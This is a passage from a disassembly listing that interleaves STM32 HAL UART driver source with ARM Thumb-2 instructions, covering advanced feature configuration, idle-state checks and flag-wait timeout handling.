  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_SWAP_INIT))
 8005990:	687b      	ldr	r3, [r7, #4]
 8005992:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005994:	f003 0308 	and.w	r3, r3, #8
 8005998:	2b00      	cmp	r3, #0
 800599a:	d00a      	beq.n	80059b2 <UART_AdvFeatureConfig+0x2a>
  {
    assert_param(IS_UART_ADVFEATURE_SWAP(huart->AdvancedInit.Swap));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_SWAP, huart->AdvancedInit.Swap);
 800599c:	687b      	ldr	r3, [r7, #4]
 800599e:	681b      	ldr	r3, [r3, #0]
 80059a0:	685b      	ldr	r3, [r3, #4]
 80059a2:	f423 4100 	bic.w	r1, r3, #32768	; 0x8000
 80059a6:	687b      	ldr	r3, [r7, #4]
 80059a8:	6b5a      	ldr	r2, [r3, #52]	; 0x34
 80059aa:	687b      	ldr	r3, [r7, #4]
 80059ac:	681b      	ldr	r3, [r3, #0]
 80059ae:	430a      	orrs	r2, r1
 80059b0:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure TX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_TXINVERT_INIT))
 80059b2:	687b      	ldr	r3, [r7, #4]
 80059b4:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80059b6:	f003 0301 	and.w	r3, r3, #1
 80059ba:	2b00      	cmp	r3, #0
 80059bc:	d00a      	beq.n	80059d4 <UART_AdvFeatureConfig+0x4c>
  {
    assert_param(IS_UART_ADVFEATURE_TXINV(huart->AdvancedInit.TxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_TXINV, huart->AdvancedInit.TxPinLevelInvert);
 80059be:	687b      	ldr	r3, [r7, #4]
 80059c0:	681b      	ldr	r3, [r3, #0]
 80059c2:	685b      	ldr	r3, [r3, #4]
 80059c4:	f423 3100 	bic.w	r1, r3, #131072	; 0x20000
 80059c8:	687b      	ldr	r3, [r7, #4]
 80059ca:	6a9a      	ldr	r2, [r3, #40]	; 0x28
 80059cc:	687b      	ldr	r3, [r7, #4]
 80059ce:	681b      	ldr	r3, [r3, #0]
 80059d0:	430a      	orrs	r2, r1
 80059d2:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX pin active level inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXINVERT_INIT))
 80059d4:	687b      	ldr	r3, [r7, #4]
 80059d6:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80059d8:	f003 0302 	and.w	r3, r3, #2
 80059dc:	2b00      	cmp	r3, #0
 80059de:	d00a      	beq.n	80059f6 <UART_AdvFeatureConfig+0x6e>
  {
    assert_param(IS_UART_ADVFEATURE_RXINV(huart->AdvancedInit.RxPinLevelInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_RXINV, huart->AdvancedInit.RxPinLevelInvert);
 80059e0:	687b      	ldr	r3, [r7, #4]
 80059e2:	681b      	ldr	r3, [r3, #0]
 80059e4:	685b      	ldr	r3, [r3, #4]
 80059e6:	f423 3180 	bic.w	r1, r3, #65536	; 0x10000
 80059ea:	687b      	ldr	r3, [r7, #4]
 80059ec:	6ada      	ldr	r2, [r3, #44]	; 0x2c
 80059ee:	687b      	ldr	r3, [r7, #4]
 80059f0:	681b      	ldr	r3, [r3, #0]
 80059f2:	430a      	orrs	r2, r1
 80059f4:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure data inversion */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DATAINVERT_INIT))
 80059f6:	687b      	ldr	r3, [r7, #4]
 80059f8:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80059fa:	f003 0304 	and.w	r3, r3, #4
 80059fe:	2b00      	cmp	r3, #0
 8005a00:	d00a      	beq.n	8005a18 <UART_AdvFeatureConfig+0x90>
  {
    assert_param(IS_UART_ADVFEATURE_DATAINV(huart->AdvancedInit.DataInvert));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_DATAINV, huart->AdvancedInit.DataInvert);
 8005a02:	687b      	ldr	r3, [r7, #4]
 8005a04:	681b      	ldr	r3, [r3, #0]
 8005a06:	685b      	ldr	r3, [r3, #4]
 8005a08:	f423 2180 	bic.w	r1, r3, #262144	; 0x40000
 8005a0c:	687b      	ldr	r3, [r7, #4]
 8005a0e:	6b1a      	ldr	r2, [r3, #48]	; 0x30
 8005a10:	687b      	ldr	r3, [r7, #4]
 8005a12:	681b      	ldr	r3, [r3, #0]
 8005a14:	430a      	orrs	r2, r1
 8005a16:	605a      	str	r2, [r3, #4]
  }

  /* if required, configure RX overrun detection disabling */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_RXOVERRUNDISABLE_INIT))
 8005a18:	687b      	ldr	r3, [r7, #4]
 8005a1a:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a1c:	f003 0310 	and.w	r3, r3, #16
 8005a20:	2b00      	cmp	r3, #0
 8005a22:	d00a      	beq.n	8005a3a <UART_AdvFeatureConfig+0xb2>
  {
    assert_param(IS_UART_OVERRUN(huart->AdvancedInit.OverrunDisable));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_OVRDIS, huart->AdvancedInit.OverrunDisable);
 8005a24:	687b      	ldr	r3, [r7, #4]
 8005a26:	681b      	ldr	r3, [r3, #0]
 8005a28:	689b      	ldr	r3, [r3, #8]
 8005a2a:	f423 5180 	bic.w	r1, r3, #4096	; 0x1000
 8005a2e:	687b      	ldr	r3, [r7, #4]
 8005a30:	6b9a      	ldr	r2, [r3, #56]	; 0x38
 8005a32:	687b      	ldr	r3, [r7, #4]
 8005a34:	681b      	ldr	r3, [r3, #0]
 8005a36:	430a      	orrs	r2, r1
 8005a38:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure DMA disabling on reception error */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_DMADISABLEONERROR_INIT))
 8005a3a:	687b      	ldr	r3, [r7, #4]
 8005a3c:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a3e:	f003 0320 	and.w	r3, r3, #32
 8005a42:	2b00      	cmp	r3, #0
 8005a44:	d00a      	beq.n	8005a5c <UART_AdvFeatureConfig+0xd4>
  {
    assert_param(IS_UART_ADVFEATURE_DMAONRXERROR(huart->AdvancedInit.DMADisableonRxError));
    MODIFY_REG(huart->Instance->CR3, USART_CR3_DDRE, huart->AdvancedInit.DMADisableonRxError);
 8005a46:	687b      	ldr	r3, [r7, #4]
 8005a48:	681b      	ldr	r3, [r3, #0]
 8005a4a:	689b      	ldr	r3, [r3, #8]
 8005a4c:	f423 5100 	bic.w	r1, r3, #8192	; 0x2000
 8005a50:	687b      	ldr	r3, [r7, #4]
 8005a52:	6bda      	ldr	r2, [r3, #60]	; 0x3c
 8005a54:	687b      	ldr	r3, [r7, #4]
 8005a56:	681b      	ldr	r3, [r3, #0]
 8005a58:	430a      	orrs	r2, r1
 8005a5a:	609a      	str	r2, [r3, #8]
  }

  /* if required, configure auto Baud rate detection scheme */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_AUTOBAUDRATE_INIT))
 8005a5c:	687b      	ldr	r3, [r7, #4]
 8005a5e:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005a60:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8005a64:	2b00      	cmp	r3, #0
 8005a66:	d01a      	beq.n	8005a9e <UART_AdvFeatureConfig+0x116>
  {
    assert_param(IS_USART_AUTOBAUDRATE_DETECTION_INSTANCE(huart->Instance));
    assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATE(huart->AdvancedInit.AutoBaudRateEnable));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_ABREN, huart->AdvancedInit.AutoBaudRateEnable);
 8005a68:	687b      	ldr	r3, [r7, #4]
 8005a6a:	681b      	ldr	r3, [r3, #0]
 8005a6c:	685b      	ldr	r3, [r3, #4]
 8005a6e:	f423 1180 	bic.w	r1, r3, #1048576	; 0x100000
 8005a72:	687b      	ldr	r3, [r7, #4]
 8005a74:	6c1a      	ldr	r2, [r3, #64]	; 0x40
 8005a76:	687b      	ldr	r3, [r7, #4]
 8005a78:	681b      	ldr	r3, [r3, #0]
 8005a7a:	430a      	orrs	r2, r1
 8005a7c:	605a      	str	r2, [r3, #4]
    /* set auto Baudrate detection parameters if detection is enabled */
    if (huart->AdvancedInit.AutoBaudRateEnable == UART_ADVFEATURE_AUTOBAUDRATE_ENABLE)
 8005a7e:	687b      	ldr	r3, [r7, #4]
 8005a80:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8005a82:	f5b3 1f80 	cmp.w	r3, #1048576	; 0x100000
 8005a86:	d10a      	bne.n	8005a9e <UART_AdvFeatureConfig+0x116>
    {
      assert_param(IS_UART_ADVFEATURE_AUTOBAUDRATEMODE(huart->AdvancedInit.AutoBaudRateMode));
      MODIFY_REG(huart->Instance->CR2, USART_CR2_ABRMODE, huart->AdvancedInit.AutoBaudRateMode);
 8005a88:	687b      	ldr	r3, [r7, #4]
 8005a8a:	681b      	ldr	r3, [r3, #0]
 8005a8c:	685b      	ldr	r3, [r3, #4]
 8005a8e:	f423 01c0 	bic.w	r1, r3, #6291456	; 0x600000
 8005a92:	687b      	ldr	r3, [r7, #4]
 8005a94:	6c5a      	ldr	r2, [r3, #68]	; 0x44
 8005a96:	687b      	ldr	r3, [r7, #4]
 8005a98:	681b      	ldr	r3, [r3, #0]
 8005a9a:	430a      	orrs	r2, r1
 8005a9c:	605a      	str	r2, [r3, #4]
    }
  }

  /* if required, configure MSB first on communication line */
  if (HAL_IS_BIT_SET(huart->AdvancedInit.AdvFeatureInit, UART_ADVFEATURE_MSBFIRST_INIT))
 8005a9e:	687b      	ldr	r3, [r7, #4]
 8005aa0:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8005aa2:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8005aa6:	2b00      	cmp	r3, #0
 8005aa8:	d00a      	beq.n	8005ac0 <UART_AdvFeatureConfig+0x138>
  {
    assert_param(IS_UART_ADVFEATURE_MSBFIRST(huart->AdvancedInit.MSBFirst));
    MODIFY_REG(huart->Instance->CR2, USART_CR2_MSBFIRST, huart->AdvancedInit.MSBFirst);
 8005aaa:	687b      	ldr	r3, [r7, #4]
 8005aac:	681b      	ldr	r3, [r3, #0]
 8005aae:	685b      	ldr	r3, [r3, #4]
 8005ab0:	f423 2100 	bic.w	r1, r3, #524288	; 0x80000
 8005ab4:	687b      	ldr	r3, [r7, #4]
 8005ab6:	6c9a      	ldr	r2, [r3, #72]	; 0x48
 8005ab8:	687b      	ldr	r3, [r7, #4]
 8005aba:	681b      	ldr	r3, [r3, #0]
 8005abc:	430a      	orrs	r2, r1
 8005abe:	605a      	str	r2, [r3, #4]
  }
}
 8005ac0:	bf00      	nop
 8005ac2:	370c      	adds	r7, #12
 8005ac4:	46bd      	mov	sp, r7
 8005ac6:	f85d 7b04 	ldr.w	r7, [sp], #4
 8005aca:	4770      	bx	lr

08005acc <UART_CheckIdleState>:
  * @brief Check the UART Idle State.
  * @param huart UART handle.
  * @retval HAL status
  */
HAL_StatusTypeDef UART_CheckIdleState(UART_HandleTypeDef *huart)
{
 8005acc:	b580      	push	{r7, lr}
 8005ace:	b098      	sub	sp, #96	; 0x60
 8005ad0:	af02      	add	r7, sp, #8
 8005ad2:	6078      	str	r0, [r7, #4]
  uint32_t tickstart;

  /* Initialize the UART ErrorCode */
  huart->ErrorCode = HAL_UART_ERROR_NONE;
 8005ad4:	687b      	ldr	r3, [r7, #4]
 8005ad6:	2200      	movs	r2, #0
 8005ad8:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

  /* Init tickstart for timeout management */
  tickstart = HAL_GetTick();
 8005adc:	f7fb fb62 	bl	80011a4 <HAL_GetTick>
 8005ae0:	6578      	str	r0, [r7, #84]	; 0x54

  /* Check if the Transmitter is enabled */
  if ((huart->Instance->CR1 & USART_CR1_TE) == USART_CR1_TE)
 8005ae2:	687b      	ldr	r3, [r7, #4]
 8005ae4:	681b      	ldr	r3, [r3, #0]
 8005ae6:	681b      	ldr	r3, [r3, #0]
 8005ae8:	f003 0308 	and.w	r3, r3, #8
 8005aec:	2b08      	cmp	r3, #8
 8005aee:	d12e      	bne.n	8005b4e <UART_CheckIdleState+0x82>
  {
    /* Wait until TEACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_TEACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005af0:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005af4:	9300      	str	r3, [sp, #0]
 8005af6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005af8:	2200      	movs	r2, #0
 8005afa:	f44f 1100 	mov.w	r1, #2097152	; 0x200000
 8005afe:	6878      	ldr	r0, [r7, #4]
 8005b00:	f000 f88c 	bl	8005c1c <UART_WaitOnFlagUntilTimeout>
 8005b04:	4603      	mov	r3, r0
 8005b06:	2b00      	cmp	r3, #0
 8005b08:	d021      	beq.n	8005b4e <UART_CheckIdleState+0x82>
    {
      /* Disable TXE interrupt for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE_TXFNFIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_TXEIE));
 8005b0a:	687b      	ldr	r3, [r7, #4]
 8005b0c:	681b      	ldr	r3, [r3, #0]
 8005b0e:	63bb      	str	r3, [r7, #56]	; 0x38
 */
__STATIC_FORCEINLINE uint32_t __LDREXW(volatile uint32_t *addr)
{
    uint32_t result;

   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005b10:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8005b12:	e853 3f00 	ldrex	r3, [r3]
 8005b16:	637b      	str	r3, [r7, #52]	; 0x34
   return(result);
 8005b18:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8005b1a:	f023 0380 	bic.w	r3, r3, #128	; 0x80
 8005b1e:	653b      	str	r3, [r7, #80]	; 0x50
 8005b20:	687b      	ldr	r3, [r7, #4]
 8005b22:	681b      	ldr	r3, [r3, #0]
 8005b24:	461a      	mov	r2, r3
 8005b26:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8005b28:	647b      	str	r3, [r7, #68]	; 0x44
 8005b2a:	643a      	str	r2, [r7, #64]	; 0x40
 */
__STATIC_FORCEINLINE uint32_t __STREXW(uint32_t value, volatile uint32_t *addr)
{
   uint32_t result;

   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005b2c:	6c39      	ldr	r1, [r7, #64]	; 0x40
 8005b2e:	6c7a      	ldr	r2, [r7, #68]	; 0x44
 8005b30:	e841 2300 	strex	r3, r2, [r1]
 8005b34:	63fb      	str	r3, [r7, #60]	; 0x3c
   return(result);
 8005b36:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8005b38:	2b00      	cmp	r3, #0
 8005b3a:	d1e6      	bne.n	8005b0a <UART_CheckIdleState+0x3e>
#endif /* USART_CR1_FIFOEN */

      huart->gState = HAL_UART_STATE_READY;
 8005b3c:	687b      	ldr	r3, [r7, #4]
 8005b3e:	2220      	movs	r2, #32
 8005b40:	67da      	str	r2, [r3, #124]	; 0x7c

      __HAL_UNLOCK(huart);
 8005b42:	687b      	ldr	r3, [r7, #4]
 8005b44:	2200      	movs	r2, #0
 8005b46:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005b4a:	2303      	movs	r3, #3
 8005b4c:	e062      	b.n	8005c14 <UART_CheckIdleState+0x148>
    }
  }

  /* Check if the Receiver is enabled */
  if ((huart->Instance->CR1 & USART_CR1_RE) == USART_CR1_RE)
 8005b4e:	687b      	ldr	r3, [r7, #4]
 8005b50:	681b      	ldr	r3, [r3, #0]
 8005b52:	681b      	ldr	r3, [r3, #0]
 8005b54:	f003 0304 	and.w	r3, r3, #4
 8005b58:	2b04      	cmp	r3, #4
 8005b5a:	d149      	bne.n	8005bf0 <UART_CheckIdleState+0x124>
  {
    /* Wait until REACK flag is set */
    if (UART_WaitOnFlagUntilTimeout(huart, USART_ISR_REACK, RESET, tickstart, HAL_UART_TIMEOUT_VALUE) != HAL_OK)
 8005b5c:	f06f 437e 	mvn.w	r3, #4261412864	; 0xfe000000
 8005b60:	9300      	str	r3, [sp, #0]
 8005b62:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8005b64:	2200      	movs	r2, #0
 8005b66:	f44f 0180 	mov.w	r1, #4194304	; 0x400000
 8005b6a:	6878      	ldr	r0, [r7, #4]
 8005b6c:	f000 f856 	bl	8005c1c <UART_WaitOnFlagUntilTimeout>
 8005b70:	4603      	mov	r3, r0
 8005b72:	2b00      	cmp	r3, #0
 8005b74:	d03c      	beq.n	8005bf0 <UART_CheckIdleState+0x124>
      /* Disable RXNE, PE and ERR (Frame error, noise error, overrun error)
      interrupts for the interrupt process */
#if defined(USART_CR1_FIFOEN)
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE_RXFNEIE | USART_CR1_PEIE));
#else
      ATOMIC_CLEAR_BIT(huart->Instance->CR1, (USART_CR1_RXNEIE | USART_CR1_PEIE));
 8005b76:	687b      	ldr	r3, [r7, #4]
 8005b78:	681b      	ldr	r3, [r3, #0]
 8005b7a:	627b      	str	r3, [r7, #36]	; 0x24
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005b7c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8005b7e:	e853 3f00 	ldrex	r3, [r3]
 8005b82:	623b      	str	r3, [r7, #32]
   return(result);
 8005b84:	6a3b      	ldr	r3, [r7, #32]
 8005b86:	f423 7390 	bic.w	r3, r3, #288	; 0x120
 8005b8a:	64fb      	str	r3, [r7, #76]	; 0x4c
 8005b8c:	687b      	ldr	r3, [r7, #4]
 8005b8e:	681b      	ldr	r3, [r3, #0]
 8005b90:	461a      	mov	r2, r3
 8005b92:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 8005b94:	633b      	str	r3, [r7, #48]	; 0x30
 8005b96:	62fa      	str	r2, [r7, #44]	; 0x2c
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005b98:	6af9      	ldr	r1, [r7, #44]	; 0x2c
 8005b9a:	6b3a      	ldr	r2, [r7, #48]	; 0x30
 8005b9c:	e841 2300 	strex	r3, r2, [r1]
 8005ba0:	62bb      	str	r3, [r7, #40]	; 0x28
   return(result);
 8005ba2:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8005ba4:	2b00      	cmp	r3, #0
 8005ba6:	d1e6      	bne.n	8005b76 <UART_CheckIdleState+0xaa>
#endif /* USART_CR1_FIFOEN */
      ATOMIC_CLEAR_BIT(huart->Instance->CR3, USART_CR3_EIE);
 8005ba8:	687b      	ldr	r3, [r7, #4]
 8005baa:	681b      	ldr	r3, [r3, #0]
 8005bac:	3308      	adds	r3, #8
 8005bae:	613b      	str	r3, [r7, #16]
   __ASM volatile ("ldrex %0, %1" : "=r" (result) : "Q" (*addr) );
 8005bb0:	693b      	ldr	r3, [r7, #16]
 8005bb2:	e853 3f00 	ldrex	r3, [r3]
 8005bb6:	60fb      	str	r3, [r7, #12]
   return(result);
 8005bb8:	68fb      	ldr	r3, [r7, #12]
 8005bba:	f023 0301 	bic.w	r3, r3, #1
 8005bbe:	64bb      	str	r3, [r7, #72]	; 0x48
 8005bc0:	687b      	ldr	r3, [r7, #4]
 8005bc2:	681b      	ldr	r3, [r3, #0]
 8005bc4:	3308      	adds	r3, #8
 8005bc6:	6cba      	ldr	r2, [r7, #72]	; 0x48
 8005bc8:	61fa      	str	r2, [r7, #28]
 8005bca:	61bb      	str	r3, [r7, #24]
   __ASM volatile ("strex %0, %2, %1" : "=&r" (result), "=Q" (*addr) : "r" (value) );
 8005bcc:	69b9      	ldr	r1, [r7, #24]
 8005bce:	69fa      	ldr	r2, [r7, #28]
 8005bd0:	e841 2300 	strex	r3, r2, [r1]
 8005bd4:	617b      	str	r3, [r7, #20]
   return(result);
 8005bd6:	697b      	ldr	r3, [r7, #20]
 8005bd8:	2b00      	cmp	r3, #0
 8005bda:	d1e5      	bne.n	8005ba8 <UART_CheckIdleState+0xdc>

      huart->RxState = HAL_UART_STATE_READY;
 8005bdc:	687b      	ldr	r3, [r7, #4]
 8005bde:	2220      	movs	r2, #32
 8005be0:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80

      __HAL_UNLOCK(huart);
 8005be4:	687b      	ldr	r3, [r7, #4]
 8005be6:	2200      	movs	r2, #0
 8005be8:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

      /* Timeout occurred */
      return HAL_TIMEOUT;
 8005bec:	2303      	movs	r3, #3
 8005bee:	e011      	b.n	8005c14 <UART_CheckIdleState+0x148>
    }
  }

  /* Initialize the UART State */
  huart->gState = HAL_UART_STATE_READY;
 8005bf0:	687b      	ldr	r3, [r7, #4]
 8005bf2:	2220      	movs	r2, #32
 8005bf4:	67da      	str	r2, [r3, #124]	; 0x7c
  huart->RxState = HAL_UART_STATE_READY;
 8005bf6:	687b      	ldr	r3, [r7, #4]
 8005bf8:	2220      	movs	r2, #32
 8005bfa:	f8c3 2080 	str.w	r2, [r3, #128]	; 0x80
  huart->ReceptionType = HAL_UART_RECEPTION_STANDARD;
 8005bfe:	687b      	ldr	r3, [r7, #4]
 8005c00:	2200      	movs	r2, #0
 8005c02:	661a      	str	r2, [r3, #96]	; 0x60
  huart->RxEventType = HAL_UART_RXEVENT_TC;
 8005c04:	687b      	ldr	r3, [r7, #4]
 8005c06:	2200      	movs	r2, #0
 8005c08:	665a      	str	r2, [r3, #100]	; 0x64

  __HAL_UNLOCK(huart);
 8005c0a:	687b      	ldr	r3, [r7, #4]
 8005c0c:	2200      	movs	r2, #0
 8005c0e:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

  return HAL_OK;
 8005c12:	2300      	movs	r3, #0
}
 8005c14:	4618      	mov	r0, r3
 8005c16:	3758      	adds	r7, #88	; 0x58
 8005c18:	46bd      	mov	sp, r7
 8005c1a:	bd80      	pop	{r7, pc}

08005c1c <UART_WaitOnFlagUntilTimeout>:
  * @param Timeout   Timeout duration
  * @retval HAL status
  */
HAL_StatusTypeDef UART_WaitOnFlagUntilTimeout(UART_HandleTypeDef *huart, uint32_t Flag, FlagStatus Status,
                                              uint32_t Tickstart, uint32_t Timeout)
{
 8005c1c:	b580      	push	{r7, lr}
 8005c1e:	b084      	sub	sp, #16
 8005c20:	af00      	add	r7, sp, #0
 8005c22:	60f8      	str	r0, [r7, #12]
 8005c24:	60b9      	str	r1, [r7, #8]
 8005c26:	603b      	str	r3, [r7, #0]
 8005c28:	4613      	mov	r3, r2
 8005c2a:	71fb      	strb	r3, [r7, #7]
  /* Wait until flag is set */
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005c2c:	e049      	b.n	8005cc2 <UART_WaitOnFlagUntilTimeout+0xa6>
  {
    /* Check for the Timeout */
    if (Timeout != HAL_MAX_DELAY)
 8005c2e:	69bb      	ldr	r3, [r7, #24]
 8005c30:	f1b3 3fff 	cmp.w	r3, #4294967295
 8005c34:	d045      	beq.n	8005cc2 <UART_WaitOnFlagUntilTimeout+0xa6>
    {
      if (((HAL_GetTick() - Tickstart) > Timeout) || (Timeout == 0U))
 8005c36:	f7fb fab5 	bl	80011a4 <HAL_GetTick>
 8005c3a:	4602      	mov	r2, r0
 8005c3c:	683b      	ldr	r3, [r7, #0]
 8005c3e:	1ad3      	subs	r3, r2, r3
 8005c40:	69ba      	ldr	r2, [r7, #24]
 8005c42:	429a      	cmp	r2, r3
 8005c44:	d302      	bcc.n	8005c4c <UART_WaitOnFlagUntilTimeout+0x30>
 8005c46:	69bb      	ldr	r3, [r7, #24]
 8005c48:	2b00      	cmp	r3, #0
 8005c4a:	d101      	bne.n	8005c50 <UART_WaitOnFlagUntilTimeout+0x34>
      {

        return HAL_TIMEOUT;
 8005c4c:	2303      	movs	r3, #3
 8005c4e:	e048      	b.n	8005ce2 <UART_WaitOnFlagUntilTimeout+0xc6>
      }

      if (READ_BIT(huart->Instance->CR1, USART_CR1_RE) != 0U)
 8005c50:	68fb      	ldr	r3, [r7, #12]
 8005c52:	681b      	ldr	r3, [r3, #0]
 8005c54:	681b      	ldr	r3, [r3, #0]
 8005c56:	f003 0304 	and.w	r3, r3, #4
 8005c5a:	2b00      	cmp	r3, #0
 8005c5c:	d031      	beq.n	8005cc2 <UART_WaitOnFlagUntilTimeout+0xa6>
      {
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_ORE) == SET)
 8005c5e:	68fb      	ldr	r3, [r7, #12]
 8005c60:	681b      	ldr	r3, [r3, #0]
 8005c62:	69db      	ldr	r3, [r3, #28]
 8005c64:	f003 0308 	and.w	r3, r3, #8
 8005c68:	2b08      	cmp	r3, #8
 8005c6a:	d110      	bne.n	8005c8e <UART_WaitOnFlagUntilTimeout+0x72>
        {
          /* Clear Overrun Error flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_OREF);
 8005c6c:	68fb      	ldr	r3, [r7, #12]
 8005c6e:	681b      	ldr	r3, [r3, #0]
 8005c70:	2208      	movs	r2, #8
 8005c72:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005c74:	68f8      	ldr	r0, [r7, #12]
 8005c76:	f000 f838 	bl	8005cea <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_ORE;
 8005c7a:	68fb      	ldr	r3, [r7, #12]
 8005c7c:	2208      	movs	r2, #8
 8005c7e:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005c82:	68fb      	ldr	r3, [r7, #12]
 8005c84:	2200      	movs	r2, #0
 8005c86:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_ERROR;
 8005c8a:	2301      	movs	r3, #1
 8005c8c:	e029      	b.n	8005ce2 <UART_WaitOnFlagUntilTimeout+0xc6>
        }
        if (__HAL_UART_GET_FLAG(huart, UART_FLAG_RTOF) == SET)
 8005c8e:	68fb      	ldr	r3, [r7, #12]
 8005c90:	681b      	ldr	r3, [r3, #0]
 8005c92:	69db      	ldr	r3, [r3, #28]
 8005c94:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 8005c98:	f5b3 6f00 	cmp.w	r3, #2048	; 0x800
 8005c9c:	d111      	bne.n	8005cc2 <UART_WaitOnFlagUntilTimeout+0xa6>
        {
          /* Clear Receiver Timeout flag*/
          __HAL_UART_CLEAR_FLAG(huart, UART_CLEAR_RTOF);
 8005c9e:	68fb      	ldr	r3, [r7, #12]
 8005ca0:	681b      	ldr	r3, [r3, #0]
 8005ca2:	f44f 6200 	mov.w	r2, #2048	; 0x800
 8005ca6:	621a      	str	r2, [r3, #32]

          /* Blocking error : transfer is aborted
          Set the UART state ready to be able to start again the process,
          Disable Rx Interrupts if ongoing */
          UART_EndRxTransfer(huart);
 8005ca8:	68f8      	ldr	r0, [r7, #12]
 8005caa:	f000 f81e 	bl	8005cea <UART_EndRxTransfer>

          huart->ErrorCode = HAL_UART_ERROR_RTO;
 8005cae:	68fb      	ldr	r3, [r7, #12]
 8005cb0:	2220      	movs	r2, #32
 8005cb2:	f8c3 2084 	str.w	r2, [r3, #132]	; 0x84

          /* Process Unlocked */
          __HAL_UNLOCK(huart);
 8005cb6:	68fb      	ldr	r3, [r7, #12]
 8005cb8:	2200      	movs	r2, #0
 8005cba:	f883 2078 	strb.w	r2, [r3, #120]	; 0x78

          return HAL_TIMEOUT;
 8005cbe:	2303      	movs	r3, #3
 8005cc0:	e00f      	b.n	8005ce2 <UART_WaitOnFlagUntilTimeout+0xc6>
  while ((__HAL_UART_GET_FLAG(huart, Flag) ? SET : RESET) == Status)
 8005cc2:	68fb      	ldr	r3, [r7, #12]
 8005cc4:	681b      	ldr	r3, [r3, #0]
 8005cc6:	69da      	ldr	r2, [r3, #28]
 8005cc8:	68bb      	ldr	r3, [r7, #8]
 8005cca:	4013      	ands	r3, r2
 8005ccc:	68ba      	ldr	r2, [r7, #8]
 8005cce:	429a      	cmp	r2, r3
 8005cd0:	bf0c      	ite	eq
 8005cd2:	2301      	moveq	r3, #1
 8005cd4:	2300      	movne	r3, #0
 8005cd6:	b2db      	uxtb	r3, r3
 8005cd8:	461a      	mov	r2, r3
 8005cda:	79fb      	ldrb	r3, [r7, #7]
 8005cdc:	429a      	cmp	r2, r3
 8005cde:	d0a6      	beq.n	8005c2e <UART_WaitOnFlagUntilTimeout+0x12>
        }
      }
    }
  }
  return HAL_OK;
 8005ce0:	2300      	movs	r3, #0
}
 8005ce2:	4618      	mov	r0, r3
 8005ce4:	3710      	adds	r7, #16
 8005ce6:	46bd      	mov	sp, r7
 8005ce8:	bd80      	pop	{r7, pc}

08005cea <UART_EndRxTransfer>:
  * @brief  End ongoing Rx transfer on UART peripheral (following error detection or Reception completion).
  * @param  huart UART handle.
  * @retval None
  */
